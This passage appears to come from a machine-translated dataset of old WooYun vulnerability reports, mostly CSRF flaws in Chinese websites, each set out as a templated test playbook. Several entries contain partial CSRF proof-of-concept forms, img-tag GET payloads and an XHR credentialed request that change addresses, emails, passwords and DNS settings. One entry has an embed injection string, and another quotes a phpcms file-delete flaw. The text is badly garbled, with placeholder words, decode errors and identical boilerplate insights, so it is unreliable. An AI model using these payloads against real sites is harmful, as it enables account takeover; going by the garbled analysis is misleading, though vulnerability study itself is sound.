**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: ina certain social platformonhastextsendtextvideolinktextclick,textshortURL:https://example.com/[redacted]

**POC**: vulnerabilityinterface:https://example.com/[redacted]]&source=3818214747&_cache_time=0&method=post

**Bypass**: Direct exploitation

**Fix**: a certain social platformtext.
---

---
### [wooyun-2014-087241] a certain textplatformtextCSRFcandeleteotherusersiteinsidemessage
**Vendor**: a certain textplatformtext | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: deletesiteinsidemessagepostrequestnotoken,canenterlineCSRFcomedeletetextmessage.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2015-0113536] Newifi y1routeradmin backendlog inBypassaftercanexecute arbitrarysystemcommandtextCSRFrisketc.
**Vendor**: a certain search engine | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: commandExecution:http://[IP redacted]

**Bypass**: Direct exploitation

**Fix**: youtranslated text
---

---
### [wooyun-2013-018470] a certain social platformtextaddfollowersvulnerability
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Case:https://example.com/[redacted]

**POC**: Case:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: .
---

---
### [wooyun-2014-055510] Renrenoftranslated textcsrf #1
**Vendor**: Renren | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textwelook atlook atsaveParametersrecvProvince=unicode-00E5unicode-00E4unicode-00BAunicode-00AC&recvCity=unicode-00E5unicode-00E4unicode-00BAunicode-00AC&recvArea=unicode-00E6unicode-00B5-unicode-00E6-unicode-00E5unicode-00BA&recvAddr=test&recvName=test&recvPostalCode=123456&recvMobile=13800138000translated textnamedtextrecvCitytextrecvArea textrecvAddrrecvName translated textnamedrecvPostalCode textrecvMobile mobile phonenumbercodethistextcanconstructonepocdeletecapture packetsget:https://example.com/[redacted]"result":true,"retCode":0}textafterthenis:{"result":text,"RETCODE":0}textbeautiful ,

**POC**: textwelook atlook atsaveParametersrecvProvince=unicode-00E5unicode-00E4unicode-00BAunicode-00AC&recvCity=unicode-00E5unicode-00E4unicode-00BAunicode-00AC&recvArea=unicode-00E6unicode-00B5-unicode-00E6-unicode-00E5unicode-00BA&recvAddr=test&recvName=test&recvPostalCode=123456&recvMobile=13800138000translated textnamedtextrecvCitytextrecvArea textrecvAddrrecvName translated textnamedrecvPostalCode textrecvMobile mobile phonenumbercodethistextcanconstructonepocdeletecapture packetsget:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2012-08065] a certain Internet companytexta certain textcanmodifytextarbitrary peopletextnamed
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: ina certain textspacepublisheffecttextgood,directlyopenthensuccess.

**Bypass**: Direct exploitation

**Fix**: addtextortextusePOST
---

---
### [wooyun-2013-026062] texthearthandlemultiple locationsCSRF
**Vendor**: xinli001.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: commenttextonlytranslated texthtmlencode...directlyusefiddlertextpacket,modifycontent,againreplaythenline

**POC**: thentextthencantextoneheapcookie,nottextistextheartuser.valuetranslated textis:1.thiswebsitealltextcommenttextallhasthisissue,onesometextpostonlytextthisalllook attextallaffected..2.websitecookieinsessionidbetextashttpOnly,textexploitcookielog intextaccount.buttext peopletextlog inortranslated textalltextiscan.3.aftertextfiltertranslated text!hereuse<script>testalltext,cantextexploitiframe,style expression/javascript, onloadtextetc.etc.cross-sitemethodshouldallcanline.4.thiswebsitetextFMtextnottext.

**Bypass**: Direct exploitation

**Fix**: textadmin backendfilter!
---

---
### [wooyun-2013-038410] shopnclatest versionone locationcsrfcantextfollow
**Vendor**: ShopNC | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: clickfollow,capture packets,asgetType,variableasbefollowid.test address,officialtestwebsite:https://example.com/[redacted]

**POC**: .

**Bypass**: Direct exploitation

**Fix**: 1 gettextpost.2 addtoken.3 validationrefer
---

---
### [wooyun-2015-0129738] textEtextarbitrarytextaddresschange(CSRF vulnerability)
**Vendor**: textEtext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: texttwo peopleaccount:testqianxiaotestqianxiao2textwelog inNo.oneaccount,foundhas peopletextaddress,wecapture packetslook atlook atlook attextnotoken,textnovalidationOK weconstructPOC,look atscreenshotgood,POCalreadyconstructgood!wecomelog inaccount2wecometextquestionPOC look atscreenshotagainlook atshipping addresstext

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: validationtoken
---

---
### [wooyun-2015-0135616] translated textone locationcsrfcan modifyuserpersonalinformation
**Vendor**: spider.com.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifypersonalinformationlocationnotaddtokenvalidation notvalidationrefer<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="usertype" value="first002" /><input type="hidden" name="useralise" value="wooyuntest" /><input type="hidden" name="sex" value="m" /><input type="hidden" name="year&#95;sld" value="2015" /><input type="hidden" name="month&#95;sld" value="01" /><input type="hidde

**POC**: pocaddress:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: pocaddress:https://example.com/[redacted]
---

---
### [wooyun-2013-017271] Iistranslated texta certain social platforma certain social platformfollowers
**Vendor**: a certain social platforma certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, upload functionality

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.translated textundertext:Ionlyistextsingletesttextselftextonesomefollowers,notext;textcantextCSRFworm,Itext!Iisgoodtext!2.start,textissuesiteis:tw.weibo.comthissiteforCSRFnottext,follow/add follow,cancelfollow,senda certain social platform,messagenotsettranslated text.Iundertexttwo peopleexample:3.follow/add followinterfaceis:https://example.com/[redacted]

**POC**: 6.good,boost followersissuetext!undertextiscancantextsendwormtext,senda certain social platform(Inotesttext),Ilook atmessagetext,notextCSRF,textistranslated textis justGETrequestmethod!textlook atundertextrequest:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: textVendorreplynotis:translated text,thisissuealreadyinsidetextfoundandtranslated textenterlineFix.
---

---
### [wooyun-2013-032522] Tomone locationtextGettypeCsrfcandirectlycausingusertextbehijack
**Vendor**: TOMintext | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: addtextuseemaillocationno tokenformuseisPOST,buttrytriedoneunder,GETtextcansuccess!!!!!!impacttranslated textoneetc.text!!!!!!so,POCas follows:<img src=https://example.com/[redacted] />textusertextquestiontexthasthistextcodepageafter,thenwilltextaddonetextuseemail,thencanrecoverpassword.undertextistext,thennottext.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: put$REQUEST['action']and$REQUEST['email2']text$_POST,andaddtranslated texttokentext20rank requesting a reward
---

---
### [wooyun-2014-054897] translated text-a certain social platform OAuth 2.0 redirect_uir CSRF vulnerability
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text-a certain social platform OAuth 2.0 during the authentication flowhttps://example.com/[redacted] CSRF attack.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: recommendVendortexthastextmethodcomeresisttextfor OAuth 2.0 redirect_uir CSRF attack.for example:1. inputuseraccountbindtextNo.threetextaccountbefore,force the user to re-enteraccountpassword.textpoint: willsacrifice user experience. becauselargetextnumberuserinlog inuseafter,isnottextagaininputpassword.2. throughvalidation referervaluecomeresistCSRF attack,
---

---
### [wooyun-2015-0154819] translated textone locationhasCSRF
**Vendor**: yaofang.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textone locationhasCSRFcanaddtextaddressaddtextaddresspostpacketinnotaddtoken textnotenterlinereferer check causingcsrfcsrf poc<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="consignee" value="xijinping" /><input type="hidden" name="mobile" value="13888888888" /><input type="hidden" name="address" value="xijinping" /><input type="hidden" name="province" value="40002" /><input type="hidden" name="ci

**POC**: WooYun: translated textone locationhascsrfcan modifyuserinformationononevulnerabilitytext textreward severaltranslated text textallno  textItext?

**Bypass**: Direct exploitation

**Fix**: WooYun: translated textone locationhascsrfcan modifyuserinformationononevulnerabilitytext textreward severaltranslated text textallno  textItext?
---

---
### [wooyun-2015-0132709] translated textone locationarbitrarychangetranslated text(CSRF)
**Vendor**: Guangzhou Duowan | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: wetextpacketlook atlook atnovalidationtoken  wetext peopleaccountlook atlook atconstructpocwetextquestionunderappear peopledownload,textwedownloadorcancelallcan.alreadychangesuccess.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2015-0162483] pointIlinkIthencancanwillentertextcsdnaccount
**Vendor**: CSDNdevelopercommunity | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: csdnbinda certain social platformlog inrequestashttps://example.com/[redacted]

**POC**: textrecorded videohttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addcsrfprotectiona certain social platformbindtextusea certain social platformusernamedpasswordlog in
---

---
### [wooyun-2010-0780] a certain Internet companya certain textspaceCSRF vulnerability
**Vendor**: a certain Internet company | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: testtext:textusertextquestionpageafter(translated textquestiontextadd,passwordmodify):

**POC**: CSRF FORMsample code:<form action="https://example.com/[redacted]" method="post"><input type="hidden" name="seq" value="335" /><input type="hidden" name="uinlist" value="***" /><!--textchecklook atusertext--><input type="hidden" name="entryq1" value="you know?" /><!--issue1--><input type="hidden" nam

**Bypass**: Direct exploitation

**Fix**: addvalidationtext,orchangesettextinputpasswordetc....
---

---
### [wooyun-2015-0124165] sixroomcanhijackarbitraryaccountenterlinearbitraryoperation
**Vendor**: sixtext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] domain="*"/></cross-domain-policy>6roomflashconfigurationfileas*,causingothertextcansendtextarbitraryrequestegobtaintranslated text:https://example.com/[redacted]  //hijackobtainthispagegettuid=53646313(textID,ifhasmanytextobtainmany)https://example.com/[redacted]  //texthijackobtaintextusertranslated textPOC:https://example.com/[redacted]

**POC**: as above.

**Bypass**: Direct exploitation

**Fix**: 1.crossdomainconfigurationtranslated text2.sensitiveoperationvalidationtoken
---

---
### [wooyun-2015-0129766] textEtextarbitrarypasswordresetvulnerability(CSRF)
**Vendor**: textEtext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: look atto peoplemodifyemailfunctionality,wetextcapture packetslook atlook at!look atdatapacket textconstructPOCwetextquestionpoclook atalreadysuccess

**POC**: thenthencanexploitemailtextpassword

**Bypass**: Direct exploitation

**Fix**: validationtoken
---

---
### [wooyun-2015-0125481] a certain video sitetextmisconfigurationcanhijackuserchecklook attranslated text
**Vendor**: a certain video sitetext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: thistextissuecanchecklook atarticleenterlinetexttesttext:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-055462] textconsole-a certain search engine OAuth 2.0 redirect_uri CSRF vulnerability
**Vendor**: textconsole | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textconsole-a certain search engine OAuth 2.0 during the authentication flowhttps://example.com/[redacted] CSRF attack.ifattackerrestartonetextconsole-a certain search engine  OAuth 2.0 authenticationrequest,andinterceptOAuth 2.0 authenticationtext

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0100676] XCar.com.cnCSRFone issue
**Vendor**: XCar.com.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issuetextinherehttps://example.com/[redacted] method="POST" name="form0" action="https://example.com/[redacted]"><input type="hidden" name="type" value=""/><input type="hidden" name="id" value=""/><input type="hidden" name="uname" value="22222"/><input type="hidden" name="sheng_id" value="1"/><input type="hidden" name

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2016-0213414] translated textmultiple locationsCSRFcantextuserpersonalinformation&text/modifyusertextaddress
**Vendor**: hujiang.com | **Year**: 2016 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: personalinformationtextlocationtextaddressaddlocation

**POC**: personalinformationtextlocationtextaddressaddlocation

**Bypass**: Direct exploitation

**Fix**: addtextCSRF tokenvalidationReferersmall reward
---

---
### [wooyun-2015-0128904] translated textone locationfunctional design flaw causescross-siterequest forgery(CSRF)#1
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textfunctional design flaw causescross-siterequest forgery(CSRF)#1poc:<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>get csrf</title></head><body><img src="https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: translated textyousendtextrequestmethodcanisPOST,notrecommenduseGETrequest.its times,aboutCSRFFixrecommend as follows.1.CAPTCHA is considered a defense againstCSRFattacks and the simplest effective defensive method.2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2015-098209] translated texta certain functional design flaw causescross-siterequest forgery(CSRF)(withpoc)
**Vendor**: jyeoo.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated texta certain functional design flaw causescross-siterequest forgery(CSRF)(withpoc).interface:https://example.com/[redacted]

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=GB2312"><title>CSRF POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="a" value="CSRFTest"/><input type="hidden" name="b" value="1"/><input type="hidden" nam

**Bypass**: Direct exploitation

**Fix**: 1.CAPTCHA is considered a defense againstCSRFattacks and the simplest effective defensive method.2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2015-0127928] translated textCSRF vulnerability
**Vendor**: xiangguo.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="province" value="decode error#166;&#143;decode error#187;decode error /><input type="hidden" name="city" value="decode error#141;&#151;decode error#185;&#179;decode error#184;&#130;" /><input type="hidden" name="county" value="text&#166;decode error#159;&#142;decode error#142;&#191;" /><input type="hidden" name="address" value="decode error#149;&#138;decode error#174;&#158;decode error#

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-049506] CSRFlook atItranslated textfollowers
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textoneunderthisonlyistextonetextsingletest,thistextiscanCSRFwormtextissuesitethenisyoutextsitetext!!siteforCSRFnottext,Icometext peopleexample:thisisfollow/add followinterfacehttps://example.com/[redacted]

**POC**: OKsuccessfollow

**Bypass**: Direct exploitation

**Fix**: requesttextisaddtokentextgoodtranslated textshouldtextreward,,text!!!
---

---
### [wooyun-2015-092029] textnamedtextcsrfchangedomain namednsserver
**Vendor**: textnamedtext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: changednslocationnotexttokenvalidationoftext

**POC**: notranslated textvaluevalidationconstructformtextquestionmalicious page afterinusernottranslated textunderdirectlychangednsneedbeattackerlocationforlog intextnamedtextstatus .

**Bypass**: Direct exploitation

**Fix**: addtokenthen can
---

---
### [wooyun-2015-0116901] translated texta certain operationCSRFhijackuser
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: haspointtext,becauseParametersinsidehasoneuid,usecometextfortexta certain translated texteffecttextisnottext.https://example.com/[redacted]

**POC**: translated textboost followerstextline,onlytextlooplarge amount ofrequestthen cantranslated textuserIDthentextenterPOC:<img src="https://example.com/[redacted]"><img src="https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2015-0124763] textcloudcommunitya certain deletefunctionalityhasCSRF vulnerability(textsingleexploittranslated textadministratortrigger)
**Vendor**: textcloudofficial | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: CSRFtext,exploittentextsingle.zonetext(text)textfunction:function DelComment(commentId){if(confirm("textdeletethiscontent?")){$.get('/index.php?do=edit&act=delcomment',{"fun":"ajax","id":commentId,"r":Math.random()},function(re){$("#commentLi_"+commentId).remove();});}}text:GETrequest,noToken,textnovalidationReferer(textnotvalidationreferernottext,aftertexthastextto).targetURL:https://example.com/[redacted]

**POC**: texthost.

**Bypass**: Direct exploitation

**Fix**: addtoken.validationReferertextisnotext,becausethisrequestthencomes fromzone.wooyun.org.
---

---
### [wooyun-2012-05032] a certain social platforma certain social platformcancausinglargetranslated textvulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textdata senda certain social platformtextsourcevalidation

**POC**: look atlook atthisa certain social platform https://example.com/[redacted] cantextundertext,translated textdeletea certain social platform,usetranslated text...<form action="https://example.com/[redacted]" method="post"  id="f2" target="ifr2"><input name="text" id="updatemsg" value=""><input name="picid" value="6d115173jw1dqo6buv5r0j"><input name="pic" value="https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: 1.addsourcerestriction2.addwhetherisajaxtext
---

---
### [wooyun-2014-087506] a certain communicationsVendortranslated texthasCSRF vulnerability
**Vendor**: a certain communications equipment vendor | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.a certain communicationsVendortranslated text:https://example.com/[redacted] ,name,gender,cartNoalliscommandorwetextmodifyinformation,nouseforcsrftexttoken,thenagaintrymodifynotsamerefererlook atwhethertextreferertext,resulttextnottextrefererisotherorastextallcansuccessmodifyinformation.

**POC**: 1.constructonemodifypersonalinformationGETtypeCSRF POC:<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://example.com/[redacted]"><html xmlns="https://example.com/[redacted]" xml:lang="en"><head><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"><title>test</title></hea

**Bypass**: Direct exploitation

**Fix**: text
---

---
### [wooyun-2012-012759] textforumcsrf
**Vendor**: texta certain e-commerce platformelectronictexthastextcompany | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: personalblog postpost,imageandvideotextlocationcanuse">truncationlink,translated textembedtext.as showntextlinkhttp://"><embed/src=//tmxk.org>,textcandirectlyf12(chrome)incontrolconsoletranslated text,effecttext,https://example.com/[redacted]

**POC**: (see original)

**Bypass**: truncationattack

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0138030] textnamedtextcsrfchangednsarbitraryparsedomain nametranslated text
**Vendor**: textnamedtext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-051557] translated textcsrfboost followers
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: forisItextItextsendonelink,https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: translated text
---

---
### [wooyun-2014-048770] phpcms v9 admin backendarbitrary filesdeletetext
**Vendor**: phpcms | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityfile:phpcms\modules\attachment\manage.phpvulnerabilitytext:123linepublic function pullic_delthumbs() {$filepath = urldecode($_GET['filepath']);$reslut = @unlink($filepath);if($reslut) exit('1');exit('0');}text:1,enterthisfunctionneedadmin backendadministrator privileges2,validationpc_hash,textcsrftranslated text3,exploitagaintextcannottextthisis onevulnerabilityusetext?ina certain sometext,texta certain someconfiguration,cancausingvariablenot initializedtextenterlineexploit

**POC**: public function pullic_delthumbs() {$filepath = urldecode($_GET['filepath']);$reslut = @unlink($filepath);if($reslut) exit('1');exit('0');}

**Bypass**: Direct exploitation

**Fix**: validationabsolute path,onlytextdeletewithtextdirectoryinsidefile.
---

---
### [wooyun-2012-015885] a certain telecom operatormobile phoneemailcsrfvulnerability
**Vendor**: a certain telecom operator | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,emailserver https://example.com/[redacted] personaltestas186numbertextemail.2,textselfsendtextonetextemail,of courseheretranslated textinsidenodirectlytexthtmlcodefunctionality(do not knowwhytextintextemailalltext,assecurity?text),directlycapture packetsmodifyunderimgtextsrcproperty,textweattackformaddress,sendtext2,returntranslated textinsidechecklook at,canlook attorequest,butnosendtextemail,textisbecausehereimgtextrequestgetdataandnoExecution.3,thatweonlycanexploittextchainmethodcomesendtogetherattack,this wayexploittextthentext,cantextvictimsendtextonetranslated textchainemail,ortextvictimtextquestiontextemail,attackeffectcancanthennotisthattranslated text,butimpacttexthas.4,textquestiontextchainafter,canlook attotextselfsendtextonetextemail,deleteemailtextiscan.

**POC**: textotherattacktextnotext,cantextlinevalidation!

**Bypass**: Direct exploitation

**Fix**: youislargetext.
---

---
### [wooyun-2016-0176391] ACFUNallinterfacenotaddvalidation cantranslated textworm
**Vendor**: textparttextnetworktexthastextcompanytranslated textcompany | **Year**: 2016 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textismodifytextnamedinterfaceaddress:https://example.com/[redacted]

**POC**: ACFUNlog instatusundertextquestion https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: nottextalltextonesometranslated text,textnotisthistext
---

---
### [wooyun-2013-027098] a certain social platforma certain textGETtypecsrfcantextsendworm!!!
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityhasfortranslated textforwardlocation,copycomeis onePOSTrequest,butGETmethodtextcan,soimpacttranslated textoneetc.text.https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textoperationonetextusePOST!!!onetexthastoken!!!onetextvalidationreferer!!!
---

---
### [wooyun-2015-0155532] textmain sitecsrfvulnerability
**Vendor**: text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: websitemain sitemultiple locationshascsrf,thislocationusemodifyshipping addresslocationenterlinetext.modifyshipping address,capture packetstext:canlook attomessagetextinnonotcantextParameters,translated textcsrflink,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addressid=1421166&type=edit&truename=11111&prov=1&city=456&area=4443&town=42998&address=ffffff&mobile=13000000000&phone=");textquestionthislink

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtranslated textnumber
---

---
### [wooyun-2015-0106712] translated textone locationone issueCSRF
